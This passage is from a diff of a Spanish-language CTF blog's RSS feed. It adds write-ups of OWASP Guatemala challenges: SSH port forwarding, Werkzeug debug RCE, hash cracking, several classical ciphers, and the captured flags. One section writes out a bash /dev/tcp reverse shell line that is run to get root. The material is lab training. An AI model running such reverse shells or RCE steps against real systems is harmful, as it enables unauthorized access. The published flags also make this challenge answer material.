+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Active Internet connections &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;only servers&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
+tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:5355            0.0.0.0:*               LISTEN      -                   
+tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:10000           0.0.0.0:*               LISTEN      3740/socat          
+tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::5355                 :::*                    LISTEN      -                   
+tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::22                   :::*                    LISTEN      -
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Como lo dice el hint vamos a hacer port fordwarding del puerto 5000, lo vamos a traer a nuestra maquina local por medio de SSH.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -L 5656:127.0.0.1:5000 retoinfra2@192.168.1.21
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Revisamos localmente con netstat -tnpl y tenemos localmente el puerto 5000 en el puerto 5656 :).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/owasp/infra# netstat -ntpl
+Active Internet connections &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;only servers&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:111             0.0.0.0:*               LISTEN      1/init              
+tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:5656          0.0.0.0:*               LISTEN      4456/ssh            
+tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::111                  :::*                    LISTEN      1/init              
+tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; ::1:5656                :::*                    LISTEN      4456/ssh
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Como lo decia el hint, debug to rce werkzeug, encontramos un script que nos ayuda a ejecutar comandos en la maquina cuando esta activado &amp;ldquo;debug=True&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/its-arun/Werkzeug-Debug-RCE&#34;&gt;https://github.com/its-arun/Werkzeug-Debug-RCE&lt;/a&gt;&lt;br /&gt;
+Ejecutamos el script y le pasamos la ip local con el puerto que trajimos con SSH tambien le pasamos un comando y eventualmente obtenemos la bandera root.txt&lt;br /&gt;
+intra2_root.webp&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;root.txt: flag{8eab1e913f4a669eddbbd45c1484925a}&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;shell-root&#34;&gt;SHELL ROOT&lt;/h3&gt;
+&lt;p&gt;Agregamos una shell inversa a un archivo sh en la carpeta del usuario que tenemos con bajos privilegios, para ejecutarlo como usuario root.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;retoinfra2@ubuntu:~$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.10/7878 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt; &amp;gt; shell.sh
+retoinfra2@ubuntu:~$ &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
+/home/retoinfra2
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Y por medio del script ejecutamos el archivo que contiene nuestra shell inversa y obtenemos una shell como root.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/intra2_root_shell.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;root.txt: flag{8eab1e913f4a669eddbbd45c1484925a}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;user.txt: flag{598852e2cd167e254ce4c5e95393c372}&lt;/code&gt;&lt;/p&gt;
+</content:encoded>
         <dc:creator>sckull</dc:creator>
         <media:content url="https://sckull.github.io/images/posts/owasp/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
         
@@ -70,7 +422,551 @@
         <atom:modified>Sun, 19 May 2019 00:00:00 +0000</atom:modified>
         <guid>https://sckull.github.io/posts/owasp2019/</guid>
         <description>OWASP CTF es una serie de retos del OWASP Guatemala, aqui encontrarás la solucion para obtener las flags de los diferentes retos presentados por los organizadores.</description>
-        
+        <content:encoded>&lt;p&gt;OWASP CTF es una serie de retos del OWASP Guatemala, aqui encontrarás la solucion para obtener las flags de los diferentes retos presentados por los organizadores.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/owasp/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;br&gt;
+&lt;hr /&gt;
+&lt;p&gt;Aqui se listan algunas soluciones de los diferentes retos del CTF realizado en el OWASP Guatemala.&lt;/p&gt;
+&lt;h1 id=&#34;scoreboard&#34;&gt;SCOREBOARD&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/1.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/2.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;trivia&#34;&gt;TRIVIA&lt;/h1&gt;
+&lt;h2 id=&#34;dark-army&#34;&gt;Dark Army&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;whiterose&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;friends&#34;&gt;Friends&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;angela_moss&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;e-corp&#34;&gt;E-corp&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;flag{fsociety00.dat}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;fsociety&#34;&gt;Fsociety&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;mr robot&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;crypto&#34;&gt;CRYPTO&lt;/h1&gt;
+&lt;h2 id=&#34;base&#34;&gt;BASE&lt;/h2&gt;
+&lt;p&gt;Decodificamos el mensaje en base32.&lt;/p&gt;
+&lt;p&gt;Comando:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;MZWGCZ33MJQXGZJTGJPWS427OZSXE6K7MJXXEZLEEF6Q&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;====&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;base32 -d
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;flag{base32_is_very_bored!}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;pi-pi-pi&#34;&gt;PI PI PI&lt;/h2&gt;
+&lt;p&gt;Utilizando google buscamos una de las strings (&amp;ldquo;di-dah-dah&amp;rdquo;) y encontramos que es codigo morse utilizando di y dah que representan los sonidos. Codigo morse.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;dah-dah-dah di-dah-dah di-dah di-di-dit di-dah-dah-dit dah-dah-dah-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-di-dit dah-dah-dah-dah-dit
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Escribí un pequeño script en python utilizando la tabla de valores descritos en la pagina(Codigo morse).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/pipi.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Codigo: &lt;a href=&#34;https://github.com/sckull/ctf-stuff/blob/master/morse_leng.py&#34;&gt;https://github.com/sckull/ctf-stuff/blob/master/morse_leng.py&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag: OWASP0123456789&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;brain&#34;&gt;BRAIN&lt;/h2&gt;
+&lt;p&gt;Brainfuck es un lenguaje que se representa por medio de los caracteres &lt;code&gt;&amp;gt;&amp;lt;+-.,[]&lt;/code&gt; para obtener la flag se utilizo un decoder online. &lt;a href=&#34;https://www.dcode.fr/brainfuck-language&#34;&gt;https://www.dcode.fr/brainfuck-language&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;++++++++++[&amp;gt;+&amp;gt;+++&amp;gt;+++++++&amp;gt;++++++++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;-]&amp;gt;&amp;gt;&amp;gt;&amp;gt;++.++++++.-----------.++++++.++++++++++++++++++++.-------------------------.++++++++++++++++.-----------------.&amp;lt;&amp;lt;+++++++++++++++++++.&amp;gt;&amp;gt;+++++++++++++.--------.+++++++++++++++.------------------.++++++++.------------.++++++++++++++++++++++++.----------------------.++++++++++++++++++.--------------------.+++++++++.&amp;lt;&amp;lt;++.&amp;gt;&amp;gt;++++++++++.&amp;lt;&amp;lt;.&amp;gt;&amp;gt;+++++++++++.
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/brainfuck.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{bra1nfuck_was_h3r3} &lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;htp&#34;&gt;HTP&lt;/h2&gt;
+&lt;p&gt;Nos dan lo que parece una contraseña para poder obtener que tipo de hash es utilizamos hashcat, de igual forma para desencriptar la contraseña la misma herramienta.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Grecie:$apr1$9zQh77LH$cbQwfDnON90qz0mhYg1Yv.
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://hashcat.net/wiki/doku.php?id=example_hashes&#34;&gt;https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/a&gt; [1600]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/htp_1.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/htp_2.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Decrypted:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;$apr1$9zQh77LH$cbQwfDnON90qz0mhYg1Yv.:classof08
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;flag{classof08}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;turin&#34;&gt;TURIN&lt;/h2&gt;
+&lt;p&gt;En este reto nos dan un string y una imagen, con el titulo se puede concluir que pertenece a la maquina de turing y la imagen pertenece a la configuracion que debe de tener la maquina para poder obtener el mensaje oculto en el string. Utilizamos la pagina de cryptii.com para obtener nuestra flag.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;text:ixqajtrjaq
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/turin.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{heilhitler}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;impa&#34;&gt;IMPA&lt;/h2&gt;
+&lt;p&gt;Para este reto nos dan una pista, al investigar acerca del personaje nos encontramos en la wiki de zelda el lenguaje Sheikah, utilizamos imagenes de google para poder obtener nuestra bandera tambien existe un traductor en dcode.fr/sheikah-language&lt;/p&gt;
+&lt;p&gt;Wiki de Zelda: &lt;a href=&#34;https://zelda.gamepedia.com/Sheikah_Language&#34;&gt;https://zelda.gamepedia.com/Sheikah_Language&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Reto:&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/zelda_impa.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+Impa:&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/zelda.jpg&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{ZELDALOVEU}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;batman&#34;&gt;BATMAN&lt;/h2&gt;
+&lt;p&gt;Utilizamos motherreff.in(&lt;a href=&#34;https://mothereff.in/bacon&#34;&gt;https://mothereff.in/bacon&lt;/a&gt;) para decodificar la flag.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;AABABABABAAAAAAAABBA{AAAABAAAAABAABAABABBAAAAAABBAAAAABAAABBBABAAAABBBAAABAABAAAAABAAABAAABAABAAAAAAABAAABBABBA}
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/batman.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;FLAG{BATMANCHIPERISEASY}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;king&#34;&gt;KING&lt;/h2&gt;
+&lt;p&gt;Un poco de informacion de este reto, la NSA mostro un mensaje parecido a este en un twitt, segun un post (&lt;a href=&#34;https://news.ycombinator.com/item?id=7711800&#34;&gt;https://news.ycombinator.com/item?id=7711800&lt;/a&gt; ) es un tipo de rompecabezas que vienen en los periodicos. Existen difrentes paginas que pueden decodificar mensajes de este tipo.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.boxentriq.com/code-breaking/cryptogram&#34;&gt;https://www.boxentriq.com/code-breaking/cryptogram&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.oneacross.com/&#34;&gt;http://www.oneacross.com/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://quipqiup.com/&#34;&gt;https://quipqiup.com/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Para resolver este reto utilizamos una pagina de las listadas anteriormente.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/kng.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;izu gjweft yifgx izji tjluy wf yuwyu yijgiy frr vkiz jw kdu dgujt igadl j dzur jwe j hkudu fr hpaif.
+izu maxy izji fvwue izu kdu dgujt igadl yifpu izu hkudu fr hpaif rgft izu hjyigx dzur vzf fnijkwue ki rgft izu rpxkwm upuhzjwi.
+izu rpxkwm upuhzjwi mfi ki rgft j yatf vguyipug vzf fnijkwue ki kw izu yatf dzjthkfwyzkh fw yjiagw.
+izux vuwi if yjiagw nudjayu qahkiug vjy rapp fr taijwi nujsdffwy.
+izu nujsdffwy vugu rgft tjgy vzugu izu nannpx nannpuy, jw jwdkuwi rjwm izji vjy nagkue kw djtupfi pksue.
+izu nannpx nannpuy djtu njdl jiug izu dpfvwy guyaggudiue zkt kw jw jwdkuwi nagkjp yhupp fr tjmkdjpwuyy.
+izuw izu dfgwefm rgft suway puje jw jiijdl fr djwfuy fwif izu gayykjwy vzf guyhfweue nx ijlkwm tdefwjpey jvjx rgft dzkwj.
+ykwdu dzkwj ekew&amp;#39;i zjsu jwxtfgu tdefwjpey izux eudkeue if nax j hkccj zai.
+izu hkccj zai vjy izuw yifpuw nx j ijplkwm upuhzjwi rgft kwekj.
+izu upuhzjwi vjy izu maga&amp;#39;y jwe zu pksue ji izu jyzgjt kw pfy jwmupuy.
+izu upuhzjwi zje j hkm rgkuwe vzf ijamzi tjiz.
+izu hkm ubhpfeue fwu ejx jwe puri izu vzfpu vfgpe vfweugkwm.
+ykwdu izu hkm ubhpfeue izu lkwm hkm npjtue izu mkjwiy.
+ykwdu izu mkjwiy zjiue nukwm npjtue izux pue jw jiijdl fw izu lkwm jwe ykwdu izux vugu fr dfagyu tadz nkmmug izux vugu skdifgkfay.
+jriug izu mkjwiy iffl dfwigfp fr mguuwpjwe izux yijgiue rkmzikwm izu sklkwmy rgft kdupjwe.
+izu fhhfwuwiy vugu uouwpx tjidzue yf izux uweue ah euyigfxkwm ujdz fizug jwe izux nudjtu ubikwdi.
+izuw izu mfgkppjy yifpu izu zfwej igjkp 70&amp;#39;y rgft ifwx yfhgjwf izu puje mjwmyiug rgft kijpx.
+ifwx yfhgjwf jdiajppx mfi izu zfwej&amp;#39;y rgft kwekj jwxzfv njdl if izu mfgkppjy.
+izu mfgkppjy yijgiue djaykwm j galay kw izu nkm jhhpu, jdiajppx j nkm jhhpu, vzugu izux gjw fsug nkppx qfu jwe ukpuuw.
+ykwdu izu rffinjpp hpjxugy vugu dzjykwm izut izu mfgkppjy zfhhue kwif izu mkjwi hujdz vkiz qjtuy vzf vjy uydjhkwm zky uskp hjguwiy.
+izu yifgx uwey izugu k&amp;#39;t yfggx if yjx nai fz vupp zux, zux, zux.
+izu rpjm ky &amp;#34;izux jpp pksue zjhhkpx uoug jriug&amp;#34;.
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;the random story that makes no sense starts off with an ice cream truck a chef and a piece of pluto the guys that owned the ice cream truck stole the piece of pluto from the pastry chef who obtained it from the flying elephant the flying elephant got it from a sumo wrestler who obtained it in the sumo championship on saturn they went to saturn because jupiter was full of mutant beavcoons the beavcoons were from mars where the bubbly bubbles an ancient fang that was buried in camelot lived the bubbly bubbles came back ater the clowns resurrected him in an ancient burial spell of magicalness then the corndog from venus lead an attack of canoes onto the russians who responded by taking mcdonalds away from china since china didn t have anymore mcdonalds they decided to buy a pizza hut the pizza hut was then stolen by a talking elephant from india the elephant was the guru s and he lived at the ashram in los 